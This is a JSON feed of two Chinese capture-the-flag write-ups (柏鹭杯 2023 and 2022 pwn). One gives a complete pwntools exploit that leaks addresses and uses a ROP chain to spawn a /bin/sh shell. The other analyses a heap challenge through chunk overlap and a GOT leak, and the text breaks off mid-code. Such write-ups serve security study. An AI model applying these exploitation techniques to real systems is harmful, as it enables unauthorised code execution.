{
    "version": "https://jsonfeed.org/version/1",
    "title": "cumt-08213014-cyb • All posts by \"柏鹭杯\" category",
    "description": "",
    "home_page_url": "https://vvwwvv.cn",
    "items": [
        {
            "id": "https://vvwwvv.cn/2023/10/13/pwn/%E5%88%B7%E9%A2%98/%E6%9F%8F%E9%B9%AD%E6%9D%AF/%E6%9F%8F%E9%B9%AD%E6%9D%AF2023/",
            "url": "https://vvwwvv.cn/2023/10/13/pwn/%E5%88%B7%E9%A2%98/%E6%9F%8F%E9%B9%AD%E6%9D%AF/%E6%9F%8F%E9%B9%AD%E6%9D%AF2023/",
            "title": "柏鹭杯2023  pwn（）",
            "date_published": "2023-10-13T09:08:15.000Z",
            "content_html": "<h1 id=\"pwn1-eval\"><a class=\"anchor\" href=\"#pwn1-eval\">#</a> pwn1 eval</h1>\n<p>漏洞利用参考：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94dWFueHVhbmJsaW5nYmxpbmcuZ2l0aHViLmlvL2N0Zi9wd24vMjAyMC8wMi8wMS9jYWxjLw==\">https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/01/calc/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9qdW5pb3JwcmluY2V3YW5nLmdpdGh1Yi5pby8yMDE3LzEwLzAxL3B3bmFibGUtdHclRTQlQjklOEJjYWxjLw==\">https://juniorprincewang.github.io/2017/10/01/pwnable-tw 之 calc/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sb25tYXIuY24vMjAyMi8wMi8yMy9wd25hYmxldHctY2FsYy8=\">https://lonmar.cn/2022/02/23/pwnabletw-calc/</span></p>\n<h2 id=\"\"><a class=\"anchor\" href=\"#\">#</a> </h2>\n<p>漏洞原理（ <code>pwnable.tw calc</code> ）：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/14/pi9Z05q.png\" alt=\"\" /></p>\n<p>打印 <code>a1[a1[3] + 3]</code> (实际为 <code>a1[a1[3]+2]</code> )</p>\n<p>因为在打印前有个 <code>--a1[3]</code> ，所以打印的 <code>a1[a1[3]+3]</code> ，实际上为原本的 <code>a1[a1[3]+2]</code>  的值，也就是我们输入的第一个数值</p>\n<p>实际上是将打印的数组索引 <code>a1[3]+2</code>  的值修改为我们想要的偏移来打印对应的地址</p>\n<p>加法：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>a1<span class=\"token punctuation\">[</span>a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> a1<span class=\"token punctuation\">[</span>a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token comment\">//a1 [3]+2 存放的是操作数个数</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>a1<span class=\"token punctuation\">[</span>a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>a1<span class=\"token punctuation\">[</span>a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>a1<span class=\"token punctuation\">[</span>a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 这里要将 a1 [3]+2 控制为我们想要的偏移</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>a1<span class=\"token punctuation\">[</span>a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">2</span>时我们修改a1<span class=\"token punctuation\">[</span>a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span>的值也就是修改a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">2</span>的值</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">// 变相的要控制 a1 [3] 的值</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>要让a1<span class=\"token punctuation\">[</span>a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">2</span>成立，这样进行a1<span class=\"token punctuation\">[</span>a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>a1<span class=\"token punctuation\">[</span>a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>a1<span class=\"token punctuation\">[</span>a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span>也就相当于 a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token operator\">=</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span>a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>a1<span class=\"token punctuation\">[</span>a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>符号栈在输入值的地址 - 0x20 处</p>\n<p>a1[a2[]]</p>\n<p>偏移算起来有点绕，可以通过 gdb 调试来确定偏移量</p>\n<p>首先查看栈内容（输入的是 <code>9+9</code> ）</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/14/pi9ZVgO.png\" alt=\"\" /></p>\n<p>查看栈空间</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/14/pi9Zl5t.png\" alt=\"\" /></p>\n<p>由上面的知道了偏移为 52，可以计算得到 libc 地址，我们还需要泄露地址来得到 pie 基地址</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/14/pi9ZHMD.png\" alt=\"\" /></p>\n<p>向上偏移 10 可以泄露地址，然后减去 pie 的偏移（低地址不变），得到 pie 基址，利用该基址通过 Ropgadget 计算得到 rdi_ret 的地址</p>\n<p>然后就可以构造 rop 链了</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./eval'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./eval'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p = remote(\"8.130.74.108\", 32199)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>context<span class=\"token punctuation\">.</span>arch <span class=\"token operator\">=</span> <span class=\"token string\">'amd64'</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># leak pie</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b\"-10\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>leak <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>success<span class=\"token punctuation\">(</span><span class=\"token string\">\"leak: \"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>leak<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>pie_base <span class=\"token operator\">=</span> leak <span class=\"token operator\">-</span> <span class=\"token number\">0x1060</span> <span class=\"token comment\"># 0x1060 is the offset of `push    r15` in pie</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>success<span class=\"token punctuation\">(</span><span class=\"token string\">\"pie_base: \"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>pie_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># leak stack</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b\"-9\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>leak <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>success<span class=\"token punctuation\">(</span><span class=\"token string\">\"leak: \"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>leak<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>stack_addr <span class=\"token operator\">=</span> leak <span class=\"token operator\">-</span> <span class=\"token number\">0x1fd81</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>success<span class=\"token punctuation\">(</span><span class=\"token string\">\"stack_addr: \"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>stack_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># leak libc</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b\"+52\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>leak <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>success<span class=\"token punctuation\">(</span><span class=\"token string\">\"leak: \"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>leak<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>libc_base <span class=\"token operator\">=</span> leak <span class=\"token operator\">-</span> <span class=\"token number\">0x24083</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>success<span class=\"token punctuation\">(</span><span class=\"token string\">\"libc_base: \"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\"># rbp 对应 `+51`</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\"># p.sendline(f\"+50+&#123;0xf93 + pie_base&#125;\")</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\"># p.sendline(f\"+49&#123;canary&#125;\")</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p_rdi_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000000023b6a</span> <span class=\"token operator\">+</span> libc_base</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>bin_sh <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b\"/bin/sh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>__next__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>system <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000000022679</span> <span class=\"token operator\">+</span> libc_base</pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\"># 布置 system (\"/bin/sh\")</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>rop_chain <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    p_rdi_ret<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    bin_sh<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    system</pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"+54+</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>system<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"+53+</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>ret<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"+52+</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>bin_sh<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token comment\"># print(p.pid)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\"># input(\"pause\")</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"+51+</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>p_rdi_ret<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token comment\"># p.sendline(f\"+49&#123;canary&#125;\")</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token comment\"># print(p.pid)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token comment\"># input(\"pause\")</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token comment\"># 触发正常的 ret</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/10/09/pwn/%E5%88%B7%E9%A2%98/%E6%9F%8F%E9%B9%AD%E6%9D%AF/%E6%9F%8F%E9%B9%AD%E6%9D%AF2022%20%20pwn/",
            "url": "https://vvwwvv.cn/2023/10/09/pwn/%E5%88%B7%E9%A2%98/%E6%9F%8F%E9%B9%AD%E6%9D%AF/%E6%9F%8F%E9%B9%AD%E6%9D%AF2022%20%20pwn/",
            "title": "柏鹭杯2022  pwn（）",
            "date_published": "2023-10-09T09:08:15.000Z",
            "content_html": "<h1 id=\"pwn1-note1\"><a class=\"anchor\" href=\"#pwn1-note1\">#</a> pwn1 note1</h1>\n<h2 id=\"1程序分析\"><a class=\"anchor\" href=\"#1程序分析\">#</a> 1. 程序分析</h2>\n<p>64 位程序，发现保护全开了</p>\n<pre><code>~~![](/2022picture/1.png)~~\n</code></pre>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/09/pPxdlSH.png\" alt=\"\" /></p>\n<h3 id=\"ida查看一下\"><a class=\"anchor\" href=\"#ida查看一下\">#</a> ida 查看一下：</h3>\n<p><code>main:</code></p>\n<pre><code>~~![](/2022picture/2.png)~~\n</code></pre>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/09/pPxdY0P.png\" alt=\"\" /></p>\n<p><code>v3=1时：</code></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/09/pPxdqAK.png\" alt=\"\" /></p>\n<p>这里发现对于输入的 tag 始终是在 <code>先</code> 创建的 0x20 的 chunk 中，而对于 name 的 chunk 是 tag 的下一个；并且这里发现 func1、2、3 没有任何区别</p>\n<p><code>v3=2时：</code></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/09/pPxw6vd.png\" alt=\"\" /></p>\n<p>看到这里对 <code>name</code> 、 <code>tag</code> 、 <code>func</code>  都可以重新编辑了</p>\n<p><code>v3=3时：</code></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/09/pPxwT2Q.png\" alt=\"\" /></p>\n<p>这里的 <code>qword_4050[v6]</code>  为什么是输出了 tag 和 name 并不太明白，gdb 调试时发现是这样的，并且其他地方调用的 func 也是运用了 <code>qword_4050[]</code>  这个</p>\n<h2 id=\"2漏洞分析\"><a class=\"anchor\" href=\"#2漏洞分析\">#</a> 2. 漏洞分析：</h2>\n<p>由于该程序开启了 pie，那么我们需要先泄露一个地址，然后计算出基地址</p>\n<p>这里首先我创建了两个堆块，然后查看一下堆块的内部情况</p>\n<pre><code>id=0，name_length=64，name=aaa，tag=bbb，fun=1\n\nid=1，name_length=64，name=bbb，tag=dddd，fun=1\n</code></pre>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/09/pPxBEOs.png\" alt=\"\" /></p>\n<p>这里也能看出来，tag 的 chunk 位置是在上面，而 name 的 chunk 在下面，而我们输入的内容的后面的地址存入的值类似于地址（黄色框内）, 查看一下：</p>\n<p>发现是代码段:</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/09/pPxBD6H.png\" alt=\"\" /></p>\n<p>而我们知道 pie 是页对齐的，低几位的地址是固定的，在 ida 中发现了其偏移为 <code>0x131B</code> ：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/09/pPxBIXj.png\" alt=\"\" /></p>\n<p>由此我们能够算出基地址为 <code>base=leak_addr-0x131B</code></p>\n<p>因此我们需要泄露这个地址，而我们在 new 函数中编辑 tag 是通过 <code>fgets</code> （读入输入的数据后会在末尾添加 &quot;\\x00&quot;，加入限定输入 8 个，则会将输入的第 8 个变成 <code>\\x00</code> ）<br />\n，但是在 <code>edit_tag</code>  里是用的 <code>scanf</code>  (只有遇到空白符才会停下，在输入的字符串结尾加入 <code>\\x00</code> )</p>\n<p>而后面的地址是 <code>func1</code>  的，所以他会将 <code>func1</code>  的地址的最低位变成 <code>\\x00</code></p>\n<h3 id=\"泄露代码段基址\"><a class=\"anchor\" href=\"#泄露代码段基址\">#</a> 泄露代码段基址：</h3>\n<p>上面我们已经知道了 scanf 的特殊处，【在我的理解里我们输入 8 个字符后它会将后面的函数地址的 <code>低字节</code> 给改成 <code>\\x00</code>  代表前面的字符串输入完成，所以我们需要修改 <code>func</code>  来重新载入地址，使能够连带着输出 <code>func</code>  地址】</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>new<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">64</span><span class=\"token punctuation\">,</span><span class=\"token string\">b\"a\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">b\"b\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>edit_tag<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>edit_func<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>call<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p.recvuntil (\"tag: \\n\")# 这里这样会报错</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"aaaaaaaa\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>text_base<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">0x131B</span><span class=\"token operator\">//</span>这里是以小端序输出的所以这样接收</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"text:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>text_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>new<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">64</span><span class=\"token punctuation\">,</span><span class=\"token string\">b\"a\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">b\"b\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#在这里没作用</span></pre></td></tr></table></figure><p>这里用 <code>u64(p.recv(6).ljust(8,b'\\x00'))</code>  接收，下面的图里可以发现是小端序的格式（ <code>0a</code>  是换行符）：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/10/pPxzQZ4.png\" alt=\"\" /></p>\n<h3 id=\"得到了基地址pie来计算got表的函数地址并泄露\"><a class=\"anchor\" href=\"#得到了基地址pie来计算got表的函数地址并泄露\">#</a> 得到了基地址（pie）来计算 <code>got</code>  表的函数地址并泄露</h3>\n<p>起初想的是通过上面的泄露方式将 put_gots 的地址输入进去然后泄露出来：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>edit_tag<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token string\">b\"aaaaaaaa\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>puts_got<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>但是仍然无法实现</p>\n<p>不过前面发现 edit_name 有个 free，但是指针却没有置 0，所以我们可以进行 <code>堆重叠</code></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/10/pPzCoHU.png\" alt=\"\" /></p>\n<p>通过 edit_name 将 id 为 0 的 chunk 大小改为 0x20，接着申请一个 chunk（此时申请的 chunk 会存在于最开始的 chunk0 的空间）最后再将第一个 chunk 的修改回去，这样就能够覆盖到下一个 chunk（也就是溢出到第二个 <code>tag</code>  所产生的 chunk），bk 修改成 puts_got 的地址，然后再通过上面的方式进行泄露</p>\n<p>来仔细探究一下 <code>tag</code>  的 <code>chunk</code>  的构造</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/10/pPzAIk8.png\" alt=\"\" /></p>\n<p>在上面的图里就能发现 <code>tag</code>  内容对应的是 <code>a1</code> ，而 <code>name</code>  对应的是 <code>a1+16</code> ，正好和 func 里的对应，并且 <code>tag 后 </code> 存放的是 <code>func</code>  的地址，会调用该函数，然后去将前面地址内的 <code>tag</code>  直接当作内容（对应 <code>char * a1</code> ），后面的作为地址，去 <code>取其地址中</code> 的值（对应 <code>char ** a1</code> ）</p>\n<p>而我们知道 <code>got表</code> 内存放的是函数的真实地址，所以我们通过 <code>got</code>  的地址来泄露真实地址，那么我们就需要通过  <code>name</code>  这来利用 <code>地址寻找内容</code> 泄露（所以才不能用 tag 泄露）</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td 